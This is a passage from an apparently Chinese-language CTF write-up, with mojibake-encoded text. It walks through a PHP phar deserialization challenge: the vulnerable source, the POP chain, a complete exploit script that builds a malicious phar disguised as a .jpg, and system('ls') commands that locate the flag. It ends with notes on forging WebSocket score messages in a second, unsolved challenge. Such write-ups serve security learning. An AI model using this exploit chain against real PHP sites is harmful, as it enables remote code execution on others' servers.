class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Act</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$checkAccess</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$id</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;  <br>        <br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;id !== <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;id !== <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">switch</span>(<span class="hljs-variable language_">$this</span>-&gt;id) &#123;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;checkAccess) &#123;<br>                        <br>                        <span class="hljs-keyword">include</span>(<span class="hljs-variable language_">$this</span>-&gt;checkAccess);<br>                       <span class="hljs-comment">//çœ‹è¿™ä¸ª  æ–‡ä»¶åŒ…å«</span><br>                    &#125;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;id invalid in &quot;</span>.<span class="hljs-keyword">__CLASS__</span>.<span class="hljs-keyword">__FUNCTION__</span>);<br>                 <span class="hljs-comment">//   æŠ›å‡ºæ–°çš„å¼‚å¸¸</span><br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-keyword">break</span>;         <br>            &#125;<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Con</span> </span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$formatters</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$providers</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFormatter</span>(<span class="hljs-params"><span class="hljs-variable">$formatter</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;formatters[<span class="hljs-variable">$formatter</span>])) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;formatters[<span class="hljs-variable">$formatter</span>];<br>        &#125;<br>    <br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;providers <span class="hljs-keyword">as</span> <span class="hljs-variable">$provider</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">method_exists</span>(<span class="hljs-variable">$provider</span>, <span class="hljs-variable">$formatter</span>)) &#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;formatters[<span class="hljs-variable">$formatter</span>] = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$provider</span>, <span class="hljs-variable">$formatter</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;formatters[<span class="hljs-variable">$formatter</span>];<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">\InvalidArgumentException</span>(<span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&#x27;Unknown formatter &quot;%s&quot;&#x27;</span>, <span class="hljs-variable">$formatter</span>));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">getFormatter</span>(<span class="hljs-variable">$name</span>), <span class="hljs-variable">$arguments</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Mmm</span> </span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;hello.php&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Jbn</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$reader</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/gopher|phar|http|file|ftp|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;invalid protocol found in &#x27;</span>.<span class="hljs-keyword">__CLASS__</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome to &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;source.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <br>        <br>        <span class="hljs-variable language_">$this</span>-&gt;str-&gt;<span class="hljs-title function_ invoke__">reset</span>();<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">reset</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;reader !== <span class="hljs-literal">null</span>) &#123;<br>            <br>            <br>            <span class="hljs-variable language_">$this</span>-&gt;reader-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>ç»§ç»­çœ‹</p>
<p>çœ‹åˆ°</p>
<p>file_exists(fpath)</p>
<p>è¿™ä¸ªå¯ä»¥è§¦å‘pharååºåˆ—åŒ–</p>
<p>pharæ–‡ä»¶ï¼Œæ‰“å¼€è¯¥æ–‡ä»¶å¯ä»¥çœ‹åˆ°æ–‡ä»¶å¤´æ˜¯<code>&lt;?php __halt_compiler(); ?&gt;</code>ä»¥åŠä¸­é—´çš„éƒ¨åˆ†å†…å®¹æ˜¯åºåˆ—åŒ–çš„å½¢å¼å­˜åœ¨äºè¿™ä¸ªæ–‡ä»¶ä¸­ã€‚</p>
<p><img src="https://image.3001.net/images/20211119/1637308825_619759992d43a3b586529.png!small" srcset="/img/loading.gif" lazyload alt=""></p>
<p>phpä¸€å¤§éƒ¨åˆ†çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°åœ¨é€šè¿‡phar://ä¼ªåè®®è§£æpharæ–‡ä»¶æ—¶ï¼Œéƒ½ä¼šå°†meta-dataè¿›è¡Œååºåˆ—åŒ–äºæ˜¯å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ è¯¦ç»†åŸç†ï¼š<a target="_blank" rel="noopener" href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a></p>
<p>è¯¥æ–¹æ³•åœ¨æ–‡ä»¶ç³»ç»Ÿå‡½æ•°ï¼ˆ<code>file_exists()</code>ã€<code>is_dir()</code>ç­‰ï¼‰å‚æ•°å¯æ§çš„æƒ…å†µä¸‹ï¼Œé…åˆphar://ä¼ªåè®®ï¼Œå¯ä»¥ä¸ä¾èµ–<code>unserialize()</code>ç›´æ¥è¿›è¡Œååºåˆ—åŒ–æ“ä½œã€‚</p>
<p>é‚£ååºåˆ—åŒ–è¿™å°±ç®€å•äº†ï¼Œç»§ç»­çœ‹</p>
<ol>
<li><code>Act</code> ç±»ï¼šå¯ä»¥ç”¨äºå¤„ç†æ–‡ä»¶ä¸Šä¼ çš„é€»è¾‘ã€‚ä½ å¯ä»¥åœ¨ <code>run()</code> æ–¹æ³•ä¸­ç¼–å†™å¤„ç†ä¸Šä¼ æ–‡ä»¶çš„ä»£ç ã€‚æ ¹æ® <code>$id</code> çš„ä¸åŒå€¼ï¼Œä½ å¯ä»¥æ‰§è¡Œä¸åŒçš„æ“ä½œï¼Œæ¯”å¦‚æ£€æŸ¥ç”¨æˆ·æƒé™ã€éªŒè¯æ–‡ä»¶ç±»å‹å’Œå¤§å°ç­‰ã€‚</li>
<li><code>Con</code> ç±»ï¼šå¯ä»¥ç”¨äºå¤„ç†æ–‡ä»¶çš„æ ¼å¼åŒ–å’Œè½¬æ¢æ“ä½œã€‚ä½ å¯ä»¥å®šä¹‰ä¸åŒçš„æ ¼å¼åŒ–å™¨ï¼ˆå¦‚å›¾ç‰‡å‹ç¼©ã€æ–‡ä»¶è½¬æ¢ï¼‰ä½œä¸º <code>$providers</code> æ•°ç»„çš„å…ƒç´ ï¼Œå¹¶ä½¿ç”¨ <code>getFormatter()</code> æ–¹æ³•è·å–ç‰¹å®šçš„æ ¼å¼åŒ–å™¨æ¥å¤„ç†ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶ã€‚</li>
<li><code>Mmm</code> ç±»ï¼šå¯ä»¥ç”¨äºå¤„ç†æ–‡ä»¶ä¸Šä¼ æˆåŠŸåçš„æ“ä½œã€‚ä½ å¯ä»¥åœ¨ <code>__invoke()</code> æ–¹æ³•ä¸­ç¼–å†™ä¸Šä¼ æˆåŠŸåçš„é€»è¾‘ï¼Œæ¯”å¦‚ç”Ÿæˆç¼©ç•¥å›¾ã€å‘é€é€šçŸ¥ç­‰ã€‚ä½ å¯ä»¥åœ¨ä¸Šä¼ æ–‡ä»¶æˆåŠŸååˆ›å»ºä¸€ä¸ª <code>Mmm</code> å¯¹è±¡å¹¶æ‰§è¡Œå®ƒï¼Œä»¥è§¦å‘åç»­æ“ä½œã€‚</li>
<li><code>Jbn</code> ç±»ï¼šå¯ä»¥ç”¨äºå¤„ç†æ–‡ä»¶çš„è¯»å–å’Œå…³é—­æ“ä½œã€‚ä½ å¯ä»¥åœ¨ <code>__construct()</code> æ–¹æ³•ä¸­ä¼ å…¥ä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„ï¼Œç„¶ååœ¨ <code>reset()</code> æ–¹æ³•ä¸­å…³é—­æ–‡ä»¶è¯»å–å™¨ï¼Œä»¥ç¡®ä¿æ–‡ä»¶èµ„æºå¾—åˆ°æ­£ç¡®é‡Šæ”¾ã€‚</li>
</ol>
<p>popé“¾</p>
<p>__wakeup</p>
<p>toString<br>
reset<br>
__call<br>
getFormatter<br>
run</p>
<ol>
<li>ååºåˆ—åŒ–ï¼Œè°ƒjbnç±» <code>__wakeup()</code></li>
<li>å¯¹è±¡è½¬æ¢å­—ç¬¦ä¸²ï¼Œè°ƒç”¨ jbn ä¸­ <code>__toString()</code></li>
<li>reseté‡ç½®ã€‚</li>
<li>åœ¨ <code>Con</code> ç±»ä¸­ï¼Œè°ƒ <code>__call()</code>ï¼Œè°ƒ <code>getFormatter()</code></li>
<li><code>getFormatter()</code> æ–¹æ³•è¿”å›æ ¼å¼åŒ–å™¨ï¼Œæ ¼å¼åŒ–æ•°æ®</li>
<li><code>Act </code>ä¸­run()` æ‰§è¡Œ</li>
</ol>
<p>switchå¯ä»¥å¼±æ¯”è¾ƒç»•è¿‡</p>
<p>æ„é€ exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Act</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$checkAccess</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$id</span>; <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$checkAccess</span>, <span class="hljs-variable">$id</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;checkAccess = <span class="hljs-variable">$checkAccess</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;id = <span class="hljs-variable">$id</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Con</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$formatters</span>;<span class="hljs-comment">//æ•°ç»„ array(&#x27;close&#x27;=&gt;array(new Act(), &#x27;run&#x27;))</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$formatters</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;formatters = <span class="hljs-variable">$formatters</span>;<br>    &#125;<br>    <br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Jbn</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$reader</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$source</span>, <span class="hljs-variable">$str</span>, <span class="hljs-variable">$reader</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$source</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;str = <span class="hljs-variable">$str</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;reader = <span class="hljs-variable">$reader</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>); <br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <br><span class="hljs-variable">$act</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Act</span>(<span class="hljs-string">&#x27;hello.php&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>);<br><span class="hljs-variable">$formatters</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;close&#x27;</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-variable">$action</span>, <span class="hljs-string">&#x27;run&#x27;</span>));<br><span class="hljs-variable">$con</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Con</span>(<span class="hljs-variable">$formatters</span>);<br><span class="hljs-variable">$Jbn</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Jbn</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$con</span>);<br><span class="hljs-variable">$Jbn1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Jbn</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$Jbn</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br><span class="hljs-variable">$Jbn2</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Jbn</span>(<span class="hljs-variable">$Jbn1</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$jbn2</span>); <br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-title function_ invoke__">rename</span>(<span class="hljs-string">&quot;./phar.phar&quot;</span>, <span class="hljs-string">&quot;./phar.jpg&quot;</span>);<br><br><br></code></pre></td></tr></table></figure>
<p>å…ˆincludie hello.phpè¯•è¯•å¯¹äº†æ²¡</p>
<p>æˆåŠŸï¼ï¼ï¼ï¼ï¼</p>
<p>è¿›è¡Œåç»­æ“ä½œ</p>
<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231231140634784.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231231140924176.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>![](file:///C:\Users\asus\Documents\Tencent Files\2104542143\nt_qq\nt_data\Pic\2023-12\Ori\b141e639e5bdf0bd4d32c9b25098a1e7.png)</p>
<p>èšå‰‘è¿ä¸äº†</p>
<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231231150503334.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>å®ƒèƒ½æ˜¾ç¤ºå‡ºæ¥è¯´æ˜ highlightå°±èµ·ä½œç”¨äº†ï¼Œé‚£ä¹ˆå°±å·²ç»è§£æäº† æ‰‹æ‰“å°±è¡Œ</p>
<p>é‚£ä¹ˆæ‰‹æ‰“å°±å¯ä»¥å®Œæˆæ¥ä¸‹æ¥çš„æ­¥éª¤</p>
<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231231152008650.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p><code>(&quot;ls &quot;);?&gt; </code>upload</p>
<p><code>system(&quot;ls ../&quot;);?&gt; </code>html localhost localhost</p>
<p><code>system(&quot;ls ../../&quot;);?&gt; </code>cache empty lib local lock log mail opt run spool tmp www www</p>
<p><code>system(&quot;ls ../../../&quot;);?&gt; </code>bin dev etc home lib media mnt opt proc root run sbin se3ret_th1s_1s_fI5a1_flaggg srv sys tmp usr var var</p>
<p><code> </code>CBCTF{99ad7edc-6688-4995-94d9-ce63fcf608f3}</p>
<h6 id="tankTrouble-æœªåšå‡º">tankTrouble æœªåšå‡º</h6>
<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230160906147.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230161226648.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>data[â€œ::ffff:36.21.192.102â€].score=100000</p>
<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230162504375.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>WebSocket</p>
<p>ä¼—æ‰€å‘¨çŸ¥ï¼ŒWeb åº”ç”¨çš„äº¤äº’è¿‡ç¨‹é€šå¸¸æ˜¯å®¢æˆ·ç«¯é€šè¿‡æµè§ˆå™¨å‘å‡ºä¸€ä¸ªè¯·æ±‚ï¼ŒæœåŠ¡å™¨ç«¯æ¥æ”¶è¯·æ±‚åè¿›è¡Œå¤„ç†å¹¶è¿”å›ç»“æœç»™å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯æµè§ˆå™¨å°†ä¿¡æ¯å‘ˆç°ï¼Œè¿™ç§æœºåˆ¶å¯¹äºä¿¡æ¯å˜åŒ–ä¸æ˜¯ç‰¹åˆ«é¢‘ç¹çš„åº”ç”¨å°šå¯ï¼Œä½†å¯¹äºå®æ—¶è¦æ±‚é«˜ã€æµ·é‡å¹¶å‘çš„åº”ç”¨æ¥è¯´æ˜¾å¾—æ‰è¥Ÿè§è‚˜ï¼Œå°¤å…¶åœ¨å½“å‰ä¸šç•Œç§»åŠ¨äº’è”ç½‘è“¬å‹ƒå‘å±•çš„è¶‹åŠ¿ä¸‹ï¼Œé«˜å¹¶å‘ä¸ç”¨æˆ·å®æ—¶å“åº”æ˜¯ Web åº”ç”¨ç»å¸¸é¢ä¸´çš„é—®é¢˜ï¼Œæ¯”å¦‚é‡‘èè¯åˆ¸çš„å®æ—¶ä¿¡æ¯ï¼ŒWeb å¯¼èˆªåº”ç”¨ä¸­çš„åœ°ç†ä½ç½®è·å–ï¼Œç¤¾äº¤ç½‘ç»œçš„å®æ—¶æ¶ˆæ¯æ¨é€ç­‰ã€‚</p>
<p><strong>ä¼ ç»Ÿçš„è¯·æ±‚-å“åº”æ¨¡å¼çš„ Web å¼€å‘åœ¨å¤„ç†æ­¤ç±»ä¸šåŠ¡åœºæ™¯æ—¶ï¼Œé€šå¸¸é‡‡ç”¨å®æ—¶é€šè®¯æ–¹æ¡ˆï¼Œå¸¸è§çš„æ˜¯ï¼š</strong></p>
<ul>
<li>
<p><strong>è½®è¯¢ï¼š</strong><br>
åŸç†ç®€å•æ˜“æ‡‚ï¼Œå°±æ˜¯å®¢æˆ·ç«¯é€šè¿‡ä¸€å®šçš„æ—¶é—´é—´éš”ä»¥é¢‘ç¹è¯·æ±‚çš„æ–¹å¼å‘æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œæ¥ä¿æŒå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯çš„æ•°æ®åŒæ­¥ã€‚é—®é¢˜å¾ˆæ˜æ˜¾ï¼Œå½“å®¢æˆ·ç«¯ä»¥å›ºå®šé¢‘ç‡å‘æœåŠ¡å™¨ç«¯å‘é€è¯·æ±‚æ—¶ï¼ŒæœåŠ¡å™¨ç«¯çš„æ•°æ®å¯èƒ½å¹¶æ²¡æœ‰æ›´æ–°ï¼Œå¸¦æ¥å¾ˆå¤šæ— è°“è¯·æ±‚ï¼Œæµªè´¹å¸¦å®½ï¼Œæ•ˆç‡ä½ä¸‹</p>
</li>
<li>
<p>WebSocket æ˜¯ HTML5 ä¸€ç§æ–°çš„åè®®ã€‚å®ƒå®ç°äº†æµè§ˆå™¨ä¸æœåŠ¡å™¨å…¨åŒå·¥é€šä¿¡ï¼Œèƒ½æ›´å¥½çš„èŠ‚çœæœåŠ¡å™¨èµ„æºå’Œå¸¦å®½å¹¶è¾¾åˆ°å®æ—¶é€šè®¯ï¼Œå®ƒå»ºç«‹åœ¨ TCP ä¹‹ä¸Šï¼ŒåŒ HTTP ä¸€æ ·é€šè¿‡ TCP æ¥ä¼ è¾“æ•°æ®ï¼Œä½†æ˜¯å®ƒå’Œ HTTP æœ€å¤§ä¸åŒæ˜¯ï¼š</p>
<ul>
<li>WebSocket æ˜¯ä¸€ç§åŒå‘é€šä¿¡åè®®ï¼Œåœ¨å»ºç«‹è¿æ¥åï¼ŒWebSocket æœåŠ¡å™¨å’Œ Browser/Client Agent éƒ½èƒ½ä¸»åŠ¨çš„å‘å¯¹æ–¹å‘é€æˆ–æ¥æ”¶æ•°æ®ï¼Œå°±åƒ Socket ä¸€æ ·ï¼›</li>
<li>WebSocket éœ€è¦ç±»ä¼¼ TCP çš„å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯é€šè¿‡æ¡æ‰‹è¿æ¥ï¼Œè¿æ¥æˆåŠŸåæ‰èƒ½ç›¸äº’é€šä¿¡ã€‚</li>
</ul>
</li>
</ul>
<p>HTTP/1.1 200 OK<br>
Content-Type: text/plain; charset=UTF-8<br>
Content-Length: 712<br>
cache-control: no-store<br>
Date: Sun, 31 Dec 2023 15:34:42 GMT<br>
Connection: close</p>
<p>40{â€œsidâ€:â€œ_mRxMeqZGNuu8zaoAAJtâ€}42[â€œupdateâ€,{â€œ::ffff:218.201.252.9â€:{â€œxâ€:2593,â€œyâ€:2593,â€œrâ€:0,â€œhealthâ€:5,â€œscoreâ€:0}}]42[â€œupdateâ€,{â€œ::ffff:218.201.252.9â€:{â€œxâ€:2593,â€œyâ€:2593,â€œrâ€:0,â€œhealthâ€:5,â€œscoreâ€:0}}]42[â€œupdateâ€,{â€œ::ffff:218.201.252.9â€:{â€œxâ€:2593,â€œyâ€:2593,â€œrâ€:0,â€œhealthâ€:5,â€œscoreâ€:0}}]42[â€œupdateâ€,{â€œ::ffff:218.201.252.9â€:{â€œxâ€:2593,â€œyâ€:2593,â€œrâ€:0,â€œhealthâ€:5,â€œscoreâ€:0}}]42[â€œupdateâ€,{â€œ::ffff:218.201.252.9â€:{â€œxâ€:2593,â€œyâ€:2593,â€œrâ€:0,â€œhealthâ€:5,â€œscoreâ€:0}}]42[â€œupdateâ€,{â€œ::ffff:218.201.252.9â€:{â€œxâ€:2593,â€œyâ€:2593,â€œrâ€:0,â€œhealthâ€:5,â€œscoreâ€:0}}]42[â€œupdateâ€,{â€œ::ffff:218.201.252.9â€:{â€œxâ€:2593,â€œyâ€:2593,â€œrâ€:0,â€œhealthâ€:5,â€œscoreâ€:0}}]42[â€œupdateâ€,{â€œ::ffff:218.201.252.9â€:{â€œxâ€:2593,â€œyâ€:2593,â€œrâ€:0,â€œhealthâ€:5,â€œscoreâ€:0}}]</p>
<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101012742813.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>ä¸ä¼šå°±å­¦</p>
<p>èœäº†è¦è®¤ï¼ŒæŒ¨æ‰“ç«‹æ­£</p>
<p>æˆ‘ä»¬èƒ½ä¸èƒ½ä¼ªè£…socketå®¢æˆ·ç«¯å‘æœåŠ¡ç«¯å‘é€åŠ åˆ†ä¿¡æ¯ ä¸€ç›´é‡æ”¾</p>
<p>å°±å¯ä»¥æ”¹å˜æœåŠ¡ç«¯çš„æ•°æ®äº† å¥½åƒä¸è¡Œ</p>
<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101021928005.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>å…ˆåˆ†æä¸€ä¸‹è¿æ¥è¿‡ç¨‹</p>
<p>è¿™ä¸ªåº”è¯¥æ˜¯åŠåŒå·¥æˆ–è€…å…¨åŒå·¥</p>
<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101124114949.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101124059427.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101124159682.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>å›å»é€æ¡æ‰“æ–­ç‚¹åˆ†æå‰ç«¯JSé€»è¾‘</p>
<p>å‘ç°äº†è¿™ä¸ª</p>
